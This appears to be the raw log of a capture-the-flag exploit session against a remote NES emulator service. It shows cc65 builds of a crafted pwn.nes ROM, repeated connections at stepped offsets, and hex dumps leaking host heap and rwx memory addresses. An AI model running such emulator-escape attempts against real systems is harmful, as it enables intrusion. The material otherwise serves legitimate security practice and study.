[x] Opening connection to localhost on port 1337
[x] Opening connection to localhost on port 1337: Trying ::1
[+] Opening connection to localhost on port 1337: Done
[*] Closed connection to localhost port 1337
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
[*] 0x780: 0x0000000100000000 0x0000000000000001
[*] 0x790: 0xffffffff00000007 0x0000000000000000
[*] 0x7a0: 0x000000000000ac80 0x00000000000000f0
[*] 0x7b0: 0x0000555555da1ab0 0x0000000000000000
[*] 0x7c0: 0x0000000a0000000a 0x000000020000000a
[*] 0x7d0: 0x0000000000000000 0x0000000000000000
[*] 0x7e0: 0x0000000000000000 0x0000000000000000
[*] 0x7f0: 0x0000000000000020 0x0000000000000000
[*] rwx: 0xe183060301800
[*] m_RAM: 0x557e0078abc0
[*] m_RAM_rwx_off: 0xdc2b25fb76c40
[*] Closed connection to 91.107.157.58 port 3000
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
ca65 -t c64 pwn_asm.s
cl65 -o ../pwn.nes -t nes pwn.o pwn_asm.o
[*] offset: 0x8d800
[x] Opening connection to 91.107.157.58 on port 3000
[x] Opening connection to 91.107.157.58 on port 3000: Trying 91.107.157.58
[+] Opening connection to 91.107.157.58 on port 3000: Done
b'[MainBus.cpp:12] Allocated m_RAM at: 0x555555ba6210\nFailed to create /home/pwn/.cache for shader cache (Permission denied)---disabling.\n[Cartridge.cpp:52] Reading ROM from path: /tmp/tmpbjpoguow\n[Cartridge.cpp:70] Reading header, it dictates: \n[Cartridge.cpp:73] 16KB PRG-ROM Banks: 2\n[Cartridge.cpp:81] 8KB CHR-ROM Banks: 1\n[Cartridge.cpp:91] Name Table Mirroring: Vertical\n[Cartridge.cpp:95] Mapper #: 11\n[Cartridge.cpp:98] Extended (CPU) RAM: true\n[Cartridge.cpp:112] ROM is NTSC compatible.\n[Cartridge.cpp:121] Allocated m_PRG_ROM at: 0x555555f99490\n[Cartridge.cpp:127] Allocated m_CHR_ROM at: 0x555555fa14a0\nError while enumerating udev devices\nSetting vertical sync not supported\n\x03\r'
4096
2048
[*] 0x0: 0x0000000000000000 0x0000000800000018
[*] 0x10: 0x0000000000000000 0x0000800200000000
[*] 0x20: 0x0000800000008000 0xffffffffffffffff
[*] 0x30: 0xffffffffffffffff 0x0000000100000000
[*] 0x40: 0x0000000600000004 0x0000000100000001
[*] 0x50: 0x00000000000001fd 0x0000000000000000
[*] 0x60: 0x0000000000000000 0x0000806300000000
[*] 0x70: 0x0000000100000000 0x0000000000000001
[*] 0x80: 0xffffffff00000007 0x0000000000000000
[*] 0x90: 0x000000000000ad70 0x00000000000000f0
[*] 0xa0: 0x0000555555c33ba0 0x0000000000000001
[*] 0xb0: 0x0000000a0000000a 0x000000020000000a
[*] 0xc0: 0x0000000000000000 0x0000000000000000
[*] 0xd0: 0x0000000000000000 0x0000000000000000
[*] 0xe0: 0x0000000000000020 0x0000000000000000
[*] 0xf0: 0x0000000000000000 0x0000000800000018
[*] 0x100: 0x0000000000000000 0x0000800300000000
[*] 0x110: 0x0000800000008000 0xffffffffffffffff
[*] 0x120: 0xffffffffffffffff 0x0000000100000000
[*] 0x130: 0x0000000600000004 0x0000000100000001
[*] 0x140: 0x00000000000001fe 0x0000000000000000
[*] 0x150: 0x0000000000000000 0x0000806300000000
[*] 0x160: 0x0000000100000000 0x0000000000000001
[*] 0x170: 0xffffffff00000007 0x0000000000000000
[*] 0x180: 0x000000000000ae60 0x00000000000000f0
[*] 0x190: 0x0000555555c33c90 0x0000000000000001
[*] 0x1a0: 0x0000000a0000000a 0x000000020000000a
[*] 0x1b0: 0x0000000000000000 0x0000000000000000
[*] 0x1c0: 0x0000000000000000 0x0000000000000000
[*] 0x1d0: 0x0000000000000020 0x0000000000000000
[*] 0x1e0: 0x0000000000000000 0x0000000800000018
[*] 0x1f0: 0x0000000000000000 0x0000800300000000
[*] 0x200: 0x0000800000008000 0xffffffffffffffff
[*] 0x210: 0xffffffffffffffff 0x0000000100000000
[*] 0x220: 0x0000000600000004 0x0000000100000001
[*] 0x230: 0x00000000000001ff 0x0000000000000000
[*] 0x240: 0x0000000000000000 0x0000806200000000
[*] 0x250: 0x0000000100000000 0x0000000000000001
[*] 0x260: 0xffffffff00000007 0x0000000000000000
[*] 0x270: 0x000000000000af50 0x00000000000000f0
[*] 0x280: 0x0000555555c33d80 0x0000000000000000
[*] 0x290: 0x0000000a0000000a 0x000000020000000a
[*] 0x2a0: 0x0000000000000000 0x0000000000000000
[*] 0x2b0: 0x0000000000000000 0x0000000000000000
[*] 0x2c0: 0x0000000000000020 0x0000000000000000
[*] 0x2d0: 0x0000000000000000 0x0000000000000020
[*] 0x2e0: 0x0000000000000000 0x0000800300000000
[*] 0x2f0: 0x0000800000008000 0xffffffffffffffff
[*] 0x300: 0xffffffffffffffff 0x0000000100000000
[*] 0x310: 0x0000000600000004 0x0000000100000001
[*] 0x320: 0x0000000000000200 0x0000000000000000
[*] 0x330: 0x0000000000000000 0x0000806300000000
[*] 0x340: 0x0000000100000000 0x0000000000000001
[*] 0x350: 0xffffffff00000007 0x0000000000000000
[*] 0x360: 0x000000000000b040 0x00000000000000f0
[*] 0x370: 0x0000555555c33e70 0x0000000000000001
[*] 0x380: 0x0000000a0000000a 0x000000020000000a
[*] 0x390: 0x0000000000000000 0x0000000000000000
[*] 0x3a0: 0x0000000000000000 0x0000000000000000
[*] 0x3b0: 0x0000000000000020 0x0000000000000000
[*] 0x3c0: 0x0000000000000000 0x0000000000000020
[*] 0x3d0: 0x0000000000000000 0x0000800300000000
[*] 0x3e0: 0x0000800000008000 0xffffffffffffffff
[*] 0x3f0: 0xffffffffffffffff 0x0000000100000000
[*] 0x400: 0x0000000600000004 0x0000000100000001
[*] 0x410: 0x0000000000000201 0x0000000000000000
[*] 0x420: 0x0000000000000000 0x0000806300000000
[*] 0x430: 0x0000000100000000 0x0000000000000001
[*] 0x440: 0xffffffff00000007 0x0000000000000000
[*] 0x450: 0x000000000000b130 0x00000000000000f0
[*] 0x460: 0x0000555555c33f60 0x0000000000000001
[*] 0x470: 0x0000000a0000000a 0x000000020000000a
[*] 0x480: 0x0000000000000000 0x0000000000000000
[*] 0x490: 0x0000000000000000 0x0000000000000000
[*] 0x4a0: 0x0000000000000020 0x0000000000000000
[*] 0x4b0: 0x0000000000000000 0x0000000000000020
[*] 0x4c0: 0x0000000000000000 0x0000800300000000
[*] 0x4d0: 0x0000800000008000 0xffffffffffffffff
[*] 0x4e0: 0xffffffffffffffff 0x0000000100000000
[*] 0x4f0: 0x0000000600000004 0x0000000100000001
[*] 0x500: 0x0000000000000202 0x0000000000000000
[*] 0x510: 0x0000000000000000 0x0000806200000000
[*] 0x520: 0x0000000100000000 0x0000000000000001
[*] 0x530: 0xffffffff00000007 0x0000000000000000
[*] 0x540: 0x000000000000b220 0x00000000000000f0
[*] 0x550: 0x0000555555c34050 0x0000000000000000
[*] 0x560: 0x0000000a0000000a 0x000000000000000a
[*] 0x570: 0x0000000000000000 0x0000000000000000
[*] 0x580: 0x0000000000000000 0x0000000000000000
[*] 0x590: 0x000000000000001e 0x0000000000000000
[*] 0x5a0: 0x0000000000000000 0x0000000000000000
[*] 0x5b0: 0x0000000000000000 0x0000800300000000
[*] 0x5c0: 0x0000800000008000 0xffffffffffffffff
[*] 0x5d0: 0xffffffffffffffff 0x0000000000000000
[*] 0x5e0: 0x0000000000000000 0x0000000000000001
[*] 0x5f0: 0x0000000000000203 0x0000000000000000
[*] 0x600: 0x0000000000000000 0x0000806300000000
[*] 0x610: 0x0000000100000000 0x0000000000000001
[*] 0x620: 0xffffffff00000007 0x0000000000000000
[*] 0x630: 0x000000000000b310 0x00000000000000f0
[*] 0x640: 0x0000555555c34140 0x0000000000000000
[*] 0x650: 0x0000000a0000000a 0x000000000000000a
[*] 0x660: 0x0000000000000000 0x0000000000000000
[*] 0x670: 0x0000000000000000 0x0000000000000000
[*] 0x680: 0x000000000000001e 0x0000001000000010
[*] 0x690: 0x0000001000000010 0x0000000000000000
[*] 0x6a0: 0x0000000000000000 0x0000800300000000
[*] 0x6b0: 0x0000800000008001 0xffffffffffffffff
[*] 0x6c0: 0xffffffffffffffff 0x0000000000000000
[*] 0x6d0: 0x0000000000000000 0x0000000000000001
[*] 0x6e0: 0x0000000000000204 0x0000000000000000
[*] 0x6f0: 0x0000000000000000 0x0000806300000000
[*] 0x700: 0x0000000100000000 0x0000000000000001
[*] 0x710: 0xffffffff00000007 0x0000000000000000
[*] 0x720: 0x000000000000b400 0x00000000000000f0
[*] 0x730: 0x0000555555c34230 0x0000000000000001
[*] 0x740: 0x0000000a0000000a 0x000000000000000a
[*] 0x750: 0x0000000000000000 0x0000000000000000
[*] 0x760: 0x0000000000000000 0x0000000000000000
[*] 0x770: 0x000000000000001e 0x0000000000000000
[*] 0x780: 0x0000000000000000 0x0000000000000000
[*] 0x790: 0x0000000000000000 0x0000800300000000
[*] 0x7a0: 0x0000800000008000 0xffffffffffffffff
[*] 0x7b0: 0xffffffffffffffff 0x0000000000000000
[*] 0x7c0: 0x0000000000000000 0x0000000000000001
[*] 0x7d0: 0x0000000000000205 0x0000000000000000
[*] 0x7e0: 0x0000000000000000 0x0000806300000000
[*] 0x7f0: 0x0000000100000000 0x0000000000000001
[*] rwx: 0xe183060301800
[*] m_RAM: 0x557e0078abc0
[*] m_RAM_rwx_off: 0xdc2b25fb76c40
[*] Closed connection to 91.107.157.58 port 3000
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
ca65 -t c64 pwn_asm.s
cl65 -o ../pwn.nes -t nes pwn.o pwn_asm.o
[*] offset: 0x8e000
[x] Opening connection to 91.107.157.58 on port 3000
[x] Opening connection to 91.107.157.58 on port 3000: Trying 91.107.157.58
[+] Opening connection to 91.107.157.58 on port 3000: Done
b'[MainBus.cpp:12] Allocated m_RAM at: 0x555555ab9210\nFailed to create /home/pwn/.cache for shader cache (Permission denied)---disabling.\n[Cartridge.cpp:52] Reading ROM from path: /tmp/tmp8ci46bcj\n[Cartridge.cpp:70] Reading header, it dictates: \n[Cartridge.cpp:73] 16KB PRG-ROM Banks: 2\n[Cartridge.cpp:81] 8KB CHR-ROM Banks: 1\n[Cartridge.cpp:91] Name Table Mirroring: Vertical\n[Cartridge.cpp:95] Mapper #: 11\n[Cartridge.cpp:98] Extended (CPU) RAM: true\n[Cartridge.cpp:112] ROM is NTSC compatible.\n[Cartridge.cpp:121] Allocated m_PRG_ROM at: 0x555555eac490\n[Cartridge.cpp:127] Allocated m_CHR_ROM at: 0x555555eb44a0\nError while enumerating udev devices\nSetting vertical sync not supported\n\x00\r'
4096
2048
[*] 0x0: 0xffffffff00000007 0x0000000000000000
[*] 0x10: 0x000000000000b4f0 0x00000001000000f0
[*] 0x20: 0x0000555555b47320 0x0000000000000001
[*] 0x30: 0x0000000a0000000a 0x000000000000000a
[*] 0x40: 0x0000000000000000 0x0000000000000000
[*] 0x50: 0x0000000000000000 0x0000000000000000
[*] 0x60: 0x000000000000001e 0x0000001000000010
[*] 0x70: 0x0000001000000010 0x0000000000000000
[*] 0x80: 0x0000000000000000 0x0000800300000000
[*] 0x90: 0x0000800000008001 0xffffffffffffffff
[*] 0xa0: 0xffffffffffffffff 0x0000000000000000
[*] 0xb0: 0x0000000000000000 0x0000000000000001
[*] 0xc0: 0x0000000000000206 0x0000000000000000
[*] 0xd0: 0x0000000000000000 0x0000806300000000
[*] 0xe0: 0x0000000100000000 0x0000000000000001
[*] 0xf0: 0xffffffff00000007 0x0000000000000000
[*] 0x100: 0x000000000000b5e0 0x00000000000000f0
[*] 0x110: 0x0000555555b47410 0x0000000000000001
[*] 0x120: 0x0000000a0000000a 0x000000000000000a
[*] 0x130: 0x0000000000000000 0x0000000000000000
[*] 0x140: 0x0000000000000000 0x0000000000000000
[*] 0x150: 0x000000000000001e 0x0000000000000000
[*] 0x160: 0x0000000000000000 0x0000000000000000
[*] 0x170: 0x0000000000000000 0x0000800300000000
[*] 0x180: 0x0000800000008000 0xffffffffffffffff
[*] 0x190: 0xffffffffffffffff 0x0000000000000000
[*] 0x1a0: 0x0000000000000000 0x0000000000000001
[*] 0x1b0: 0x0000000000000207 0x0000000000000000
[*] 0x1c0: 0x0000000000000000 0x0000806200000000
[*] 0x1d0: 0x0000000100000000 0x0000000000000001
[*] 0x1e0: 0xffffffff00000007 0x0000000000000000
[*] 0x1f0: 0x000000000000b6d0 0x00000000000000f0
[*] 0x200: 0x0000555555b47500 0x0000000000000001
[*] 0x210: 0x0000000a0000000a 0x000000000000000a
[*] 0x220: 0x0000000000000000 0x0000000000000000
[*] 0x230: 0x0000000000000000 0x0000000000000000
[*] 0x240: 0x000000000000001e 0x0000001000000010
[*] 0x250: 0x0000001000000010 0x0000000000000000
[*] 0x260: 0x0000000000000000 0x0000800300000000
[*] 0x270: 0x0000800000008001 0xffffffffffffffff
[*] 0x280: 0xffffffffffffffff 0x0000000000000000
[*] 0x290: 0x0000000000000000 0x0000000000000001
[*] 0x2a0: 0x0000000000000208 0x0000000000000000
[*] 0x2b0: 0x0000000000000000 0x0000806200000000
[*] 0x2c0: 0x0000000100000000 0x0000000000000001
[*] 0x2d0: 0xffffffff00000007 0x0000000000000000
[*] 0x2e0: 0x000000000000b7c0 0x00000000000000f0
[*] 0x2f0: 0x0000555555b475f0 0x0000000000000000
[*] 0x300: 0x0000000a0000000a 0x000000000000000a
[*] 0x310: 0x0000000000000000 0x0000000000000000
[*] 0x320: 0x0000000000000000 0x0000000000000000
[*] 0x330: 0x000000000000001e 0x0000000000000000
[*] 0x340: 0x0000000000000000 0x0000000000000010
[*] 0x350: 0x0000000000000000 0x0000800300000000
[*] 0x360: 0x0000800000008000 0xffffffffffffffff
[*] 0x370: 0xffffffffffffffff 0x0000000000000000
[*] 0x380: 0x0000000000000000 0x0000000000000001
[*] 0x390: 0x0000000000000209 0x0000000000000000
[*] 0x3a0: 0x0000000000000000 0x0000806300000000
[*] 0x3b0: 0x0000000100000000 0x0000000000000001
[*] 0x3c0: 0xffffffff00000007 0x0000000000000000
[*] 0x3d0: 0x000000000000b8b0 0x00000000000000f0
[*] 0x3e0: 0x0000555555b476e0 0x0000000000000000
[*] 0x3f0: 0x0000000a0000000a 0x000000000000000a
[*] 0x400: 0x0000000000000000 0x0000000000000000
[*] 0x410: 0x0000000000000000 0x0000000000000000
[*] 0x420: 0x000000000000001e 0x0000001000000010
[*] 0x430: 0x0000001000000010 0x0000000000000010
[*] 0x440: 0x0000000000000000 0x0000800300000000
[*] 0x450: 0x0000800000008001 0xffffffffffffffff
[*] 0x460: 0xffffffffffffffff 0x0000000000000000
[*] 0x470: 0x0000000000000000 0x0000000000000001
[*] 0x480: 0x000000000000020a 0x0000000000000000
[*] 0x490: 0x0000000000000000 0x0000806300000000
[*] 0x4a0: 0x0000000100000000 0x0000000000000001
[*] 0x4b0: 0xffffffff00000007 0x0000000000000000
[*] 0x4c0: 0x000000000000b9a0 0x00000000000000f0
[*] 0x4d0: 0x0000555555b477d0 0x0000000000000001
[*] 0x4e0: 0x0000000a0000000a 0x000000000000000a
[*] 0x4f0: 0x0000000000000000 0x0000000000000000
[*] 0x500: 0x0000000000000000 0x0000000000000000
[*] 0x510: 0x000000000000001e 0x0000000000000000
[*] 0x520: 0x0000000000000000 0x0000000000000010
[*] 0x530: 0x0000000000000000 0x0000800300000000
[*] 0x540: 0x0000800000008000 0xffffffffffffffff
[*] 0x550: 0xffffffffffffffff 0x0000000000000000
[*] 0x560: 0x0000000000000000 0x0000000000000001
[*] 0x570: 0x000000000000020b 0x0000000000000000
[*] 0x580: 0x0000000000000000 0x0000806300000000
[*] 0x590: 0x0000000100000000 0x0000000000000001
[*] 0x5a0: 0xffffffff00000007 0x0000000000000000
[*] 0x5b0: 0x000000000000ba90 0x00000000000000f0
[*] 0x5c0: 0x0000555555b478c0 0x0000000000000001
[*] 0x5d0: 0x0000000a0000000a 0x000000000000000a
[*] 0x5e0: 0x0000000000000000 0x0000000000000000
[*] 0x5f0: 0x0000000000000000 0x0000000000000000
[*] 0x600: 0x000000000000001e 0x0000001000000010
[*] 0x610: 0x0000001000000010 0x0000000000000010
[*] 0x620: 0x0000000000000000 0x0000800300000000
[*] 0x630: 0x0000800000008001 0xffffffffffffffff
[*] 0x640: 0xffffffffffffffff 0x0000000000000000
[*] 0x650: 0x0000000000000000 0x0000000000000001
[*] 0x660: 0x000000000000020c 0x0000000000000000
[*] 0x670: 0x0000000000000000 0x0000806300000000
[*] 0x680: 0x0000000100000000 0x0000000000000001
[*] 0x690: 0xffffffff00000007 0x0000000000000000
[*] 0x6a0: 0x000000000000bb80 0x00000000000000f0
[*] 0x6b0: 0x0000555555b479b0 0x0000000000000001
[*] 0x6c0: 0x0000000a0000000a 0x000000000000000a
[*] 0x6d0: 0x0000000000000000 0x0000000000000000
[*] 0x6e0: 0x0000000000000000 0x0000000000000000
[*] 0x6f0: 0x000000000000001e 0x0000000000000000
[*] 0x700: 0x0000000000000000 0x0000000000000010
[*] 0x710: 0x0000000000000000 0x0000800300000000
[*] 0x720: 0x0000800000008000 0xffffffffffffffff
[*] 0x730: 0xffffffffffffffff 0x0000000000000000
[*] 0x740: 0x0000000000000000 0x0000000000000001
[*] 0x750: 0x000000000000020d 0x0000000000000000
[*] 0x760: 0x0000000000000000 0x0000806200000000
[*] 0x770: 0x0000000100000000 0x0000000000000001
[*] 0x780: 0xffffffff00000007 0x0000000000000000
[*] 0x790: 0x000000000000bc70 0x00000000000000f0
[*] 0x7a0: 0x0000555555b47aa0 0x0000000000000001
[*] 0x7b0: 0x0000000a0000000a 0x000000000000000a
[*] 0x7c0: 0x0000000000000000 0x0000000000000000
[*] 0x7d0: 0x0000000000000000 0x0000000000000000
[*] 0x7e0: 0x000000000000001e 0x0000001000000010
[*] 0x7f0: 0x0000001000000010 0x0000000000000010
[*] rwx: 0xe183060301800
[*] m_RAM: 0x557e0078abc0
[*] m_RAM_rwx_off: 0xdc2b25fb76c40
[*] Closed connection to 91.107.157.58 port 3000
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
ca65 -t c64 pwn_asm.s
cl65 -o ../pwn.nes -t nes pwn.o pwn_asm.o
[*] offset: 0x8e800
[x] Opening connection to 91.107.157.58 on port 3000
[x] Opening connection to 91.107.157.58 on port 3000: Trying 91.107.157.58
[+] Opening connection to 91.107.157.58 on port 3000: Done
b'[MainBus.cpp:12] Allocated m_RAM at: 0x555556d0c210\nFailed to create /home/pwn/.cache for shader cache (Permission denied)---disabling.\n[Cartridge.cpp:52] Reading ROM from path: /tmp/tmpezk30ngi\n[Cartridge.cpp:70] Reading header, it dictates: \n[Cartridge.cpp:73] 16KB PRG-ROM Banks: 2\n[Cartridge.cpp:81] 8KB CHR-ROM Banks: 1\n[Cartridge.cpp:91] Name Table Mirroring: Vertical\n[Cartridge.cpp:95] Mapper #: 11\n[Cartridge.cpp:98] Extended (CPU) RAM: true\n[Cartridge.cpp:112] ROM is NTSC compatible.\n[Cartridge.cpp:121] Allocated m_PRG_ROM at: 0x5555570ff490\n[Cartridge.cpp:127] Allocated m_CHR_ROM at: 0x5555571074a0\nError while enumerating udev devices\nSetting vertical sync not supported\n\xff\r'
4096
2048
[*] 0x0: 0x0000000000000000 0x0000800300000000
[*] 0x10: 0x0000800000008001 0xfffffffeffffffff
[*] 0x20: 0xffffffffffffffff 0x0000000000000000
[*] 0x30: 0x0000000000000000 0x0000000000000001
[*] 0x40: 0x000000000000020e 0x0000000000000000
[*] 0x50: 0x0000000000000000 0x0000806200000000
[*] 0x60: 0x0000000100000000 0x0000000000000001
[*] 0x70: 0xffffffff00000007 0x0000000000000000
[*] 0x80: 0x000000000000bd60 0x00000000000000f0
[*] 0x90: 0x0000555556d9ab90 0x0000000000000000
[*] 0xa0: 0x0000000a0000000a 0x000000000000000a
[*] 0xb0: 0x0000000000000000 0x0000000000000000
[*] 0xc0: 0x0000000000000000 0x0000000000000000
[*] 0xd0: 0x000000000000001e 0x0000000000000000
[*] 0xe0: 0x0000000000000000 0x0000000000000018
[*] 0xf0: 0x0000000000000000 0x0000800300000000
[*] 0x100: 0x0000800000008000 0xffffffffffffffff
[*] 0x110: 0xffffffffffffffff 0x0000000000000000
[*] 0x120: 0x0000000000000000 0x0000000000000001
[*] 0x130: 0x000000000000020f 0x0000000000000000
[*] 0x140: 0x0000000000000000 0x0000806300000000
[*] 0x150: 0x0000000100000000 0x0000000000000001
[*] 0x160: 0xffffffff00000007 0x0000000000000000
[*] 0x170: 0x000000000000be50 0x00000000000000f0
[*] 0x180: 0x0000555556d9ac80 0x0000000000000000
[*] 0x190: 0x0000000a0000000a 0x000000000000000a
[*] 0x1a0: 0x0000000000000000 0x0000000000000000
[*] 0x1b0: 0x0000000000000000 0x0000000000000000
[*] 0x1c0: 0x000000000000001e 0x0000001000000010
[*] 0x1d0: 0x0000001000000010 0x0000000000000018
[*] 0x1e0: 0x0000000000000000 0x0000800300000000
[*] 0x1f0: 0x0000800000008001 0xffffffffffffffff
[*] 0x200: 0xffffffffffffffff 0x0000000000000000
[*] 0x210: 0x0000000000000000 0x0000000000000001
[*] 0x220: 0x0000000000000210 0x0000000000000000
[*] 0x230: 0x0000000000000000 0x0000806300000000
[*] 0x240: 0x0000000100000000 0x0000000000000001
[*] 0x250: 0xffffffff00000007 0x0000000000000000
[*] 0x260: 0x000000000000bf40 0x00000000000000f0
[*] 0x270: 0x0000555556d9ad70 0x0000000000000001
[*] 0x280: 0x0000000a0000000a 0x000000000000000a
[*] 0x290: 0x0000000000000000 0x0000000000000000
[*] 0x2a0: 0x0000000000000000 0x0000000000000000
[*] 0x2b0: 0x000000000000001e 0x0000000000000000
[*] 0x2c0: 0x0000000000000000 0x0000000000000018
[*] 0x2d0: 0x0000000000000000 0x0000800300000000
[*] 0x2e0: 0x0000800000008000 0xffffffffffffffff
[*] 0x2f0: 0xffffffffffffffff 0x0000000000000000
[*] 0x300: 0x0000000000000000 0x0000000000000001
[*] 0x310: 0x0000000000000211 0x0000000000000000
[*] 0x320: 0x0000000000000000 0x0000806300000000
[*] 0x330: 0x0000000100000000 0x0000000000000001
[*] 0x340: 0xffffffff00000007 0x0000000000000000
[*] 0x350: 0x000000000000c030 0x00000000000000f0
[*] 0x360: 0x0000555556d9ae60 0x0000000000000001
[*] 0x370: 0x0000000a0000000a 0x000000000000000a
[*] 0x380: 0x0000000000000000 0x0000000000000000
[*] 0x390: 0x0000000000000000 0x0000000000000000
[*] 0x3a0: 0x000000000000001e 0x0000001000000010
[*] 0x3b0: 0x0000001000000010 0x0000000000000018
[*] 0x3c0: 0x0000000000000000 0x0000800300000000
[*] 0x3d0: 0x0000800000008001 0xffffffffffffffff
[*] 0x3e0: 0xffffffffffffffff 0x0000000000000000
[*] 0x3f0: 0x0000000000000000 0x0000000000000001
[*] 0x400: 0x0000000000000212 0x0000000000000000
[*] 0x410: 0x0000000000000000 0x0000806300000000
[*] 0x420: 0x0000000100000000 0x0000000000000001
[*] 0x430: 0xffffffff00000007 0x0000000000000000
[*] 0x440: 0x000000000000c120 0x00000000000000f0
[*] 0x450: 0x0000555556d9af50 0x0000000000000001
[*] 0x460: 0x0000000a0000000a 0x000000000000000a
[*] 0x470: 0x0000000000000000 0x0000000000000000
[*] 0x480: 0x0000000000000000 0x0000000000000000
[*] 0x490: 0x000000000000001e 0x0000000000000000
[*] 0x4a0: 0x0000000000000000 0x0000000000000018
[*] 0x4b0: 0x0000000000000000 0x0000800300000000
[*] 0x4c0: 0x0000800000008000 0xffffffffffffffff
[*] 0x4d0: 0xffffffffffffffff 0x0000000000000000
[*] 0x4e0: 0x0000000000000000 0x0000000000000001
[*] 0x4f0: 0x0000000000000213 0x0000000000000000
[*] 0x500: 0x0000000000000000 0x0000806200000000
[*] 0x510: 0x0000000100000000 0x0000000000000001
[*] 0x520: 0xffffffff00000007 0x0000000000000000
[*] 0x530: 0x000000000000c210 0x00000000000000f0
[*] 0x540: 0x0000555556d9b040 0x0000000000000001
[*] 0x550: 0x0000000a0000000a 0x000000000000000a
[*] 0x560: 0x0000000000000000 0x0000000000000000
[*] 0x570: 0x0000000000000000 0x0000000000000000
[*] 0x580: 0x000000000000001e 0x0000001000000010
[*] 0x590: 0x0000001000000010 0x0000000000000018
[*] 0x5a0: 0x0000000000000000 0x0000800300000000
[*] 0x5b0: 0x0000800000008001 0xffffffffffffffff
[*] 0x5c0: 0xffffffffffffffff 0x0000000000000000
[*] 0x5d0: 0x0000000000000000 0x0000000000000001
[*] 0x5e0: 0x0000000000000214 0x0000000000000000
[*] 0x5f0: 0x0000000000000000 0x0000806200000000
[*] 0x600: 0x0000000100000000 0x0000000000000001
[*] 0x610: 0xffffffff00000007 0x0000000000000000
[*] 0x620: 0x000000000000c300 0x00000000000000f0
[*] 0x630: 0x0000555556d9b130 0x0000000000000000
[*] 0x640: 0x0000000a0000000a 0x000000000000000a
[*] 0x650: 0x0000000000000000 0x0000000000000000
[*] 0x660: 0x0000000000000000 0x0000000000000000
[*] 0x670: 0x000000000000001e 0x0000000000000000
[*] 0x680: 0x0000000000000000 0x0000000800000018
[*] 0x690: 0x0000000000000000 0x0000800300000000
[*] 0x6a0: 0x0000800000008000 0xffffffffffffffff
[*] 0x6b0: 0xffffffffffffffff 0x0000000000000000
[*] 0x6c0: 0x0000000000000000 0x0000000000000001
[*] 0x6d0: 0x0000000000000215 0x0000000000000000
[*] 0x6e0: 0x0000000000000000 0x0000806300000000
[*] 0x6f0: 0x0000000100000000 0x0000000000000001
[*] 0x700: 0xffffffff00000007 0x0000000000000000
[*] 0x710: 0x000000000000c3f0 0x00000000000000f0
[*] 0x720: 0x0000555556d9b220 0x0000000000000000
[*] 0x730: 0x0000000a0000000a 0x000000000000000a
[*] 0x740: 0x0000000000000000 0x0000000000000000
[*] 0x750: 0x0000000000000000 0x0000000000000000
[*] 0x760: 0x000000000000001e 0x0000001000000010
[*] 0x770: 0x0000001000000010 0x0000000800000018
[*] 0x780: 0x0000000000000000 0x0000800300000000
[*] 0x790: 0x0000800000008001 0xffffffffffffffff
[*] 0x7a0: 0xffffffffffffffff 0x0000000000000000
[*] 0x7b0: 0x0000000000000000 0x0000000000000001
[*] 0x7c0: 0x0000000000000216 0x0000000000000000
[*] 0x7d0: 0x0000000000000000 0x0000806300000000
[*] 0x7e0: 0x0000000100000000 0x0000000000000001
[*] 0x7f0: 0xffffffff00000007 0x0000000000000000
[*] rwx: 0xe183060301800
[*] m_RAM: 0x557e0078abc0
[*] m_RAM_rwx_off: 0xdc2b25fb76c40
[*] Closed connection to 91.107.157.58 port 3000
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
ca65 -t c64 pwn_asm.s
cl65 -o ../pwn.nes -t nes pwn.o pwn_asm.o
[*] offset: 0x8f000
[x] Opening connection to 91.107.157.58 on port 3000
[x] Opening connection to 91.107.157.58 on port 3000: Trying 91.107.157.58
[+] Opening connection to 91.107.157.58 on port 3000: Done
